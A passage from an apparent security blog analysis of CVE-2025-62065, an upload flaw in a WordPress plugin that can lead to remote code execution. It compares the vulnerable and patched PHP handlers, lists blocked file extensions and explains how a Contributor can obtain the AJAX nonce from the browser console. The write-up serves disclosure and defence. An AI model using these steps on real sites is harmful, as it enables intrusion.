saving.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Temporary public exposure risk:&lt;/strong&gt; because the temp file is public during processing, an attacker has time to access/set up payload before the file is unlinked.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;=&amp;gt; High likelihood of RCE.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function rtm_handle_upload_template()&#xA;{&#xA;    check_ajax_referer(&amp;#39;rtm_template_nonce&amp;#39;, &amp;#39;nonce&amp;#39;);&#xA;&#xA;    if (empty($_FILES[&amp;#39;file&amp;#39;])) {&#xA;        wp_send_json_error(&amp;#39;No File Uploaded.&amp;#39;);&#xA;    }&#xA;&#xA;    if (! current_user_can(&amp;#39;manage_options&amp;#39;)) {&#xA;        wp_send_json_error(&#xA;            array(&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Insufficient permissions&amp;#39;),&#xA;            403&#xA;        );&#xA;    }&#xA;&#xA;    $file = $_FILES[&amp;#39;file&amp;#39;];&#xA;    $ext  = strtolower(pathinfo($file[&amp;#39;name&amp;#39;], PATHINFO_EXTENSION));&#xA;    if ($ext !== &amp;#39;zip&amp;#39;) {&#xA;        wp_send_json_error(&amp;#39;Only .zip file allowed.&amp;#39;);&#xA;    }&#xA;    $upload_dir = wp_upload_dir();&#xA;    // Safe directory (not directly in public uploads)&#xA;    $base_safe_dir = $upload_dir[&amp;#39;basedir&amp;#39;] . &amp;#39;//rometheme_template/&amp;#39;;&#xA;    $tmp_dir       = $base_safe_dir . &amp;#39;tmp/&amp;#39;;&#xA;    if (! file_exists($tmp_dir)) {&#xA;        wp_mkdir_p($tmp_dir);&#xA;        // prevent php execution in this folder&#xA;        @file_put_contents(&#xA;            $base_safe_dir . &amp;#39;.htaccess&amp;#39;,&#xA;            &amp;#34;Options -Indexes &amp;lt;FilesMatch &amp;#34;.(php|phtml|phar)$&amp;#34;&amp;gt;  Deny from all&amp;lt;/FilesMatch&amp;gt;&amp;#34;&#xA;        );&#xA;    }&#xA;&#xA;    // Create unique name for zip&#xA;    $unique       = wp_generate_password(12, false);&#xA;    $tmp_zip_path = $tmp_dir . &amp;#39;upload_&amp;#39; . $unique . &amp;#39;.zip&amp;#39;;&#xA;&#xA;    // Save uploaded file to safe location&#xA;    if (! move_uploaded_file($file[&amp;#39;tmp_name&amp;#39;], $tmp_zip_path)) {&#xA;        wp_send_json_error(&#xA;            array(&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Failed save temporary file.&amp;#39;),&#xA;            500&#xA;        );&#xA;    }&#xA;&#xA;    // Process extraction with secure function&#xA;    $res = $this-&amp;gt;template_extract_secure($tmp_zip_path, $file[&amp;#39;name&amp;#39;], true);&#xA;&#xA;    // Remove temporary zip&#xA;    if (file_exists($tmp_zip_path)) {&#xA;        @unlink($tmp_zip_path);&#xA;    }&#xA;&#xA;    if ($res) {&#xA;        wp_send_json_success(&amp;#39;Template has been successfully extracted.&amp;#39;);&#xA;    } else {&#xA;        wp_send_json_error(&amp;#39;Failed extracting template.&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;function template_extract_secure($zip_path, $id, $return = false)&#xA;{&#xA;    if (empty($zip_path) || ! file_exists($zip_path)) {&#xA;        return $return ? false : wp_send_json_error([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Zip file not found.&amp;#39;], 400);&#xA;    }&#xA;&#xA;    $zip_path = realpath($zip_path);&#xA;    if (strpos($zip_path, realpath(WP_CONTENT_DIR)) !== 0) {&#xA;        return $return ? false : wp_send_json_error([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Invalid zip location.&amp;#39;, &amp;#39;path&amp;#39; =&amp;gt; $zip_path], 403);&#xA;    }&#xA;&#xA;    $upload_dir = wp_upload_dir();&#xA;    $hashId     = wp_hash($id);&#xA;    $base_dir   = $upload_dir[&amp;#39;basedir&amp;#39;] . &amp;#39;/rometheme_template&amp;#39;;&#xA;    $targetDir  = $base_dir . &amp;#39;/&amp;#39; . $hashId . &amp;#39;/&amp;#39;;&#xA;&#xA;    // create base dir &amp;#43; protect root&#xA;    if (! file_exists($base_dir)) {&#xA;        wp_mkdir_p($base_dir);&#xA;        @file_put_contents($base_dir . &amp;#39;/.htaccess&amp;#39;, &amp;#34;Options -Indexes&amp;lt;FilesMatch &amp;#34;.(php|phtml|phar)$&amp;#34;&amp;gt;  Deny from all&amp;lt;/FilesMatch&amp;gt;&amp;#34;);&#xA;    }&#xA;    if (! file_exists($targetDir)) {&#xA;        wp_mkdir_p($targetDir);&#xA;        @file_put_contents($targetDir . &amp;#39;index.html&amp;#39;, &amp;#39;&amp;lt;!-- protected --&amp;gt;&amp;#39;);&#xA;    }&#xA;&#xA;    $zip = new ZipArchive();&#xA;    if ($zip-&amp;gt;open($zip_path) !== true) {&#xA;        return $return ? false : wp_send_json_error([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Invalid or corrupt zip.&amp;#39;], 400);&#xA;    }&#xA;&#xA;    // whitelist extensions&#xA;    $allowed_ext = [&amp;#39;jpg&amp;#39;, &amp;#39;jpeg&amp;#39;, &amp;#39;png&amp;#39;, &amp;#39;gif&amp;#39;, &amp;#39;svg&amp;#39;, &amp;#39;webp&amp;#39;, &amp;#39;json&amp;#39;, &amp;#39;css&amp;#39;, &amp;#39;js&amp;#39;, &amp;#39;txt&amp;#39;, &amp;#39;html&amp;#39;, &amp;#39;htm&amp;#39;, &amp;#39;md&amp;#39;];&#xA;&#xA;    // check zip contents&#xA;    for ($i = 0; $i &amp;lt; $zip-&amp;gt;numFiles; $i&amp;#43;&amp;#43;) {&#xA;        $entry = $zip-&amp;gt;getNameIndex($i);&#xA;        if (substr($entry, -1) === &amp;#39;/&amp;#39;) continue;&#xA;&#xA;        $normalized = str_replace(&amp;#39;\\&amp;#39;, &amp;#39;/&amp;#39;, $entry);&#xA;&#xA;        // block traversal / absolute&#xA;        if (strpos($normalized, &amp;#39;../&amp;#39;) !== false || substr($normalized, 0, 1) === &amp;#39;/&amp;#39; || preg_match(&amp;#39;/^[A-Za-z]:\\\\/&amp;#39;, $entry)) {&#xA;            $zip-&amp;gt;close();&#xA;            error_log(&amp;#34;[rtm] rejected: traversal ($entry)&amp;#34;);&#xA;            return $return ? false : wp_send_json_error([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Zip contains invalid paths.&amp;#39;], 400);&#xA;        }&#xA;&#xA;        $entry_ext = strtolower(pathinfo($entry, PATHINFO_EXTENSION));&#xA;        if (empty($entry_ext) || in_array($entry_ext, [&amp;#39;php&amp;#39;, &amp;#39;phtml&amp;#39;, &amp;#39;phar&amp;#39;, &amp;#39;exe&amp;#39;, &amp;#39;sh&amp;#39;, &amp;#39;pl&amp;#39;, &amp;#39;cgi&amp;#39;], true)) {&#xA;            $zip-&amp;gt;close();&#xA;            error_log(&amp;#34;[rtm] rejected: bad extension ($entry)&amp;#34;);&#xA;            return $return ? false : wp_send_json_error([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Zip contains disallowed file types.&amp;#39;], 400);&#xA;        }&#xA;&#xA;        if (! in_array($entry_ext, $allowed_ext, true)) {&#xA;            $zip-&amp;gt;close();&#xA;            error_log(&amp;#34;[rtm] rejected: unsupported ext $entry_ext ($entry)&amp;#34;);&#xA;            return $return ? false : wp_send_json_error([&amp;#39;message&amp;#39; =&amp;gt; &amp;#34;Unsupported file type: $entry_ext&amp;#34;], 400);&#xA;        }&#xA;    }&#xA;&#xA;    // extract with original folder structure&#xA;    for ($i = 0; $i &amp;lt; $zip-&amp;gt;numFiles; $i&amp;#43;&amp;#43;) {&#xA;        $entry = $zip-&amp;gt;getNameIndex($i);&#xA;        if (substr($entry, -1) === &amp;#39;/&amp;#39;) continue;&#xA;&#xA;        $entry_ext = strtolower(pathinfo($entry, PATHINFO_EXTENSION));&#xA;        if (! in_array($entry_ext, $allowed_ext, true)) continue;&#xA;&#xA;        $normalized = str_replace(&amp;#39;\\&amp;#39;, &amp;#39;/&amp;#39;, $entry);&#xA;        $safe_name  = sanitize_file_name(basename($normalized));&#xA;        $subdir     = dirname($normalized);&#xA;&#xA;        $final_dir  = $targetDir . ($subdir !== &amp;#39;.&amp;#39; ? $subdir . &amp;#39;/&amp;#39; : &amp;#39;&amp;#39;);&#xA;        wp_mkdir_p($final_dir);&#xA;&#xA;        $target_path = $final_dir . $safe_name;&#xA;&#xA;        $stream = $zip-&amp;gt;getStream($entry);&#xA;        if ($stream === false) continue;&#xA;&#xA;        $out = fopen($target_path, &amp;#39;w&amp;#39;);&#xA;        if ($out === false) {&#xA;            fclose($stream);&#xA;            continue;&#xA;        }&#xA;&#xA;        while (! feof($stream)) fwrite($out, fread($stream, 8192));&#xA;        fclose($out);&#xA;        fclose($stream);&#xA;&#xA;        // detect embedded php&#xA;        $head = @file_get_contents($target_path, false, null, 0, 512);&#xA;        if ($head !== false &amp;amp;&amp;amp; stripos($head, &amp;#39;&amp;lt;?php&amp;#39;) !== false) {&#xA;            @unlink($target_path);&#xA;            error_log(&amp;#34;[rtm] removed suspicious file ($target_path)&amp;#34;);&#xA;            continue;&#xA;        }&#xA;&#xA;        // sanity check → skip mismatch for json so manifest.json isn&amp;#39;t removed&#xA;        $check = wp_check_filetype_and_ext($target_path, $safe_name);&#xA;        if ($entry_ext !== &amp;#39;json&amp;#39; &amp;amp;&amp;amp; $check &amp;amp;&amp;amp; isset($check[&amp;#39;ext&amp;#39;]) &amp;amp;&amp;amp; $check[&amp;#39;ext&amp;#39;] !== $entry_ext) {&#xA;            @unlink($target_path);&#xA;            error_log(&amp;#34;[rtm] removed mismatch file ($target_path)&amp;#34;);&#xA;            continue;&#xA;        }&#xA;    }&#xA;&#xA;    $zip-&amp;gt;close();&#xA;&#xA;    // update option&#xA;    $option = get_option(&amp;#39;rtm_template_installed&amp;#39;, []);&#xA;    if (! is_array($option)) $option = [];&#xA;    $option[$hashId] = [&amp;#39;template_id&amp;#39; =&amp;gt; $hashId, &amp;#39;created&amp;#39; =&amp;gt; current_time(&amp;#39;mysql&amp;#39;)];&#xA;    update_option(&amp;#39;rtm_template_installed&amp;#39;, $option);&#xA;&#xA;    return $return ? true : wp_send_json_success([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;success extract&amp;#39;, &amp;#39;template&amp;#39; =&amp;gt; $hashId]);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch has:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;User capability check:&lt;/strong&gt; adds &lt;code&gt;current_user_can(&#39;manage_options&#39;)&lt;/code&gt; → only admins can upload.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Move temporary file to a safe, non-public directory:&lt;/strong&gt; uses &lt;code&gt;wp_upload_dir()&lt;/code&gt; but creates &lt;code&gt;.../rometheme_template/tmp/&lt;/code&gt; as the temporary location, not returning a public URL for the temp file.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Create &lt;code&gt;.htaccess&lt;/code&gt; to block execution:&lt;/strong&gt; when creating the base dir, writes a &lt;code&gt;.htaccess&lt;/code&gt; with &lt;code&gt;Deny from all&lt;/code&gt; / &lt;code&gt;FilesMatch &amp;quot;\.(php|phtml|phar)$&amp;quot;&lt;/code&gt; to prevent Apache/PHP executing dangerous files.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Random temporary filename:&lt;/strong&gt; uses &lt;code&gt;wp_generate_password(12, false)&lt;/code&gt; to name files like &lt;code&gt;upload_&amp;lt;random&amp;gt;.zip&lt;/code&gt; → reduces guessability/access.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Delete temp file after processing:&lt;/strong&gt; still unlinks the zip after processing; now the file is in a non-public area before deletion.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Replace extraction with &lt;code&gt;template_extract_secure()&lt;/code&gt;:&lt;/strong&gt; the new function includes many safety checks before and during extraction:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Check ZIP file location:&lt;/strong&gt; &lt;code&gt;realpath()&lt;/code&gt; and compare with &lt;code&gt;WP_CONTENT_DIR&lt;/code&gt; to ensure zip is in an allowed directory.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Create target dirs &amp;amp; protect root:&lt;/strong&gt; create base dir and &lt;code&gt;index.html&lt;/code&gt; in targets to avoid directory listing; create &lt;code&gt;.htaccess&lt;/code&gt; in base dir.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Open ZIP safely:&lt;/strong&gt; check &lt;code&gt;open()&lt;/code&gt; success, return appropriate error if failed.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Whitelist extensions:&lt;/strong&gt; only allow safe extensions (&lt;code&gt;jpg,jpeg,png,gif,svg,webp,json,css,js,txt,html,htm,md&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Block path traversal &amp;amp; absolute paths:&lt;/strong&gt; reject entries containing &lt;code&gt;../&lt;/code&gt;, starting with &lt;code&gt;/&lt;/code&gt;, or Windows drive letters → prevents Zip Slip.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Reject dangerous extensions:&lt;/strong&gt; if an entry has empty ext or ext in blacklist (&lt;code&gt;php,phtml,phar,exe,sh,pl,cgi&lt;/code&gt;, &amp;hellip;) then close zip and return error.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Prevent mime/ext mismatches:&lt;/strong&gt; use &lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt;; if mismatch (except json) delete the file.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Scan file head for embedded PHP:&lt;/strong&gt; read first 512 bytes; if &lt;code&gt;&amp;lt;?php&lt;/code&gt; found, delete the file.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Extract files by stream:&lt;/strong&gt; write each entry to normalized/sanitized path (&lt;code&gt;sanitize_file_name(basename(...))&lt;/code&gt;) instead of &lt;code&gt;extractTo&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Safer option update:&lt;/strong&gt; store &lt;code&gt;$hashId&lt;/code&gt; with timestamp &lt;code&gt;created&lt;/code&gt; in &lt;code&gt;rtm_template_installed&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Clearer error handling/returns:&lt;/strong&gt; many &lt;code&gt;wp_send_json_error()&lt;/code&gt; with specific status/messages when issues occur (file not found, invalid zip, disallowed types&amp;hellip;).&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;=&amp;gt; Strongly reduces attack surface via ZIP upload; RCE is prevented.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;In the vulnerable version, the handler accepts an uploaded file (expects &lt;code&gt;.zip&lt;/code&gt;), saves it to the &lt;code&gt;uploads/&lt;/code&gt; folder, then calls &lt;code&gt;template_extract()&lt;/code&gt; to fetch and extract it. Finally it removes the temp file and returns JSON &lt;code&gt;success/fail&lt;/code&gt;. Specifically:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;check_ajax_referer(&#39;rtm_template_nonce&#39;, &#39;nonce&#39;)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Helps protect against CSRF — ensures the AJAX request is valid and contains a &lt;code&gt;nonce&lt;/code&gt;. Searching for &lt;code&gt;rtm_template_nonce&lt;/code&gt; in the plugin folder shows:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-04-cve-2025-62065/nonce_create.png&#34; title=&#34;How the nonce with action rtm_template_nonce is created&#34; data-thumbnail=&#34;/posts/2025-11-04-cve-2025-62065/nonce_create.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce Create&lt;/h2&gt;&lt;p&gt;How the nonce with action rtm_template_nonce is created&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-04-cve-2025-62065/nonce_create.png&#39; alt=&#34;Nonce Create&#34; height=&#34;572&#34; width=&#34;1790&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;How the nonce with action rtm_template_nonce is created&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;wp_localize_script()&lt;/code&gt; will print an inline &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; into the page and in it declare a JS object variable. In this case, the object &lt;code&gt;rkit_libs&lt;/code&gt; stores values &lt;code&gt;logo_url&lt;/code&gt;, &lt;code&gt;ajax_url&lt;/code&gt;, &lt;code&gt;template_nonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Tip&lt;/p&gt;&lt;p&gt;Because the vulnerability is disclosed with &lt;strong&gt;Contributor&lt;/strong&gt; privileges required, and Contributors can usually create &lt;strong&gt;posts&lt;/strong&gt;, we try creating a post and accessing the &lt;code&gt;rkit_libs&lt;/code&gt; object from the browser console to obtain the &lt;code&gt;nonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;We edit the post using &lt;strong&gt;Elementor&lt;/strong&gt;, because the plugin&amp;rsquo;s widgets are used in Elementor; the default editor does not include them.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-04-cve-2025-62065/get_nonce.png&#34; title=&#34;Get nonce from browser console&#34; data-thumbnail=&#34;/posts/2025-11-04-cve-2025-62065/get_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Get Nonce&lt;/h2&gt;&lt;p&gt;Get nonce from browser console&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-04-cve-2025-62065/get_nonce.png&#39; alt=&#34;Get Nonce&#34; height=&#34;649&#34; width=&#34;821&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Get nonce from browser console&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Check &lt;code&gt;$_FILES[&#39;file&#39;]&lt;/code&gt; and &lt;strong&gt;extension&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (empty($_FILES[&amp;#39;file&amp;#39;])) {&#xA;    wp_send_json_error(&amp;#39;No file uploaded.&amp;#39;);&#xA;}&#xA;&#xA;$file = $_FILES[&amp;#39;file&amp;#39;];&#xA;$ext = strtolower(pathinfo($file[&amp;#39;name&amp;#39;], PATHINFO_EXTENSION));&#xA;if ($ext !== &amp;#39;zip&amp;#39;) {&#xA;    wp_send_json_error(&amp;#39;Only .zip files are allowed.&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ensures client sent a file and only allows &lt;code&gt;.zip&lt;/code&gt; uploads.&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Determine temporary path and &lt;strong&gt;public URL&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$upload_dir = wp_upload_dir();&#xA;$tmpFilePath = $upload_dir[&amp;#39;basedir&amp;#39;] . &amp;#39;/rtm_temp_&amp;#39; . wp_unique_filename($upload_dir[&amp;#39;basedir&amp;#39;], $file[&amp;#39;name&amp;#39;]);&#xA;$tmpFileUrl  = $upload_dir[&amp;#39;baseurl&amp;#39;] . &amp;#39;/&amp;#39; . basename($tmpFilePath);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Creates a temp filename inside the &lt;strong&gt;uploads&lt;/strong&gt; directory and the access URL to that file, e.g.:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$tmpFilePath = &amp;#34;/var/www/html/wp-content/uploads/rtm_temp_filename.zip&amp;#34;&#xA;$tmpFileUrl = &amp;#34;http://localhost/wp-content/uploads/rtm_temp_filename.zip&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;move_uploaded_file($file[&#39;tmp_name&#39;], $tmpFilePath)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Moves the uploaded file from PHP temp into the defined temporary location.&lt;/p&gt;&#xA;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;Call &lt;code&gt;template_extract($tmpFileUrl, $file[&#39;name&#39;], true)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;function template_extract($url, $id, $return = false)&#xA;{&#xA;    // Get WordPress upload dir and create template directory&#xA;    $upload_dir = wp_upload_dir();&#xA;    $custom_dir = $upload_dir[&amp;#39;basedir&amp;#39;] . &amp;#39;/rometheme_template&amp;#39;;&#xA;    &#xA;    // Create temporary file to download file from URL&#xA;    $tempFile = wp_tempnam($url);&#xA;&#xA;    // Create hash ID for template&#xA;    $hashId = wp_hash($id);&#xA;    $targetDir = $custom_dir . &amp;#39;/&amp;#39; . $hashId;&#xA;&#xA;    // Download file from URL&#xA;    $response = wp_remote_get($url, [&amp;#39;timeout&amp;#39; =&amp;gt; 300]);&#xA;&#xA;    // Check for errors during download&#xA;    if (is_wp_error($response)) {&#xA;        wp_send_json_error($response-&amp;gt;get_error_message());&#xA;    }&#xA;&#xA;    // Save the ZIP contents into temp file&#xA;    $fileContent = wp_remote_retrieve_body($response);&#xA;    file_put_contents($tempFile, $fileContent);&#xA;&#xA;    // Open ZIP and extract into target directory&#xA;    $zip = new ZipArchive();&#xA;    if ($zip-&amp;gt;open($tempFile) === TRUE) {&#xA;        wp_mkdir_p($targetDir);  // Create dir if not exists&#xA;        $zip-&amp;gt;extractTo($targetDir);  // Extract to target dir&#xA;        $zip-&amp;gt;close();&#xA;        unlink($tempFile);  // Remove temp file&#xA;&#xA;        // Update &amp;#39;rtm_template_installed&amp;#39; option in database&#xA;        $option = get_option(&amp;#39;rtm_template_installed&amp;#39;, []);&#xA;        if (!is_array($option)) {&#xA;            $option = [];&#xA;        }&#xA;        $option[$hashId] = [&amp;#39;template_id&amp;#39; =&amp;gt; $id];&#xA;        update_option(&amp;#39;rtm_template_installed&amp;#39;, $option);&#xA;&#xA;        // Return result&#xA;        if ($return) {&#xA;            return true;&#xA;        } else {&#xA;            wp_send_json_success([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;success extract&amp;#39;, &amp;#39;template&amp;#39; =&amp;gt; $hashId]);&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Here the file is not extracted directly (i.e., not allowing Zip Slip to place files outside target), so Zip Slip techniques to move files to higher directories are not applicable.&lt;/p&gt;&#xA;&lt;p&gt;The final files are saved under &lt;code&gt;{wp_upload_dir}/rometheme_template/{hashId}/&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;Returns JSON&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;&lt;code&gt;rtm_handle_upload_template()&lt;/code&gt; is registered as the callback for the action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_rtm_handle_upload_template&amp;#39;, [$this, &amp;#39;rtm_handle_upload_template&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Meaning: When a user sends an AJAX request to &lt;code&gt;wp-admin/admin-ajax.php&lt;/code&gt; with &lt;code&gt;action=rtm_handle_upload_template&lt;/code&gt;, the &lt;code&gt;rtm_handle_upload_template()&lt;/code&gt; function is called to handle the request.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph LR;&#xA;A[POST REQUEST 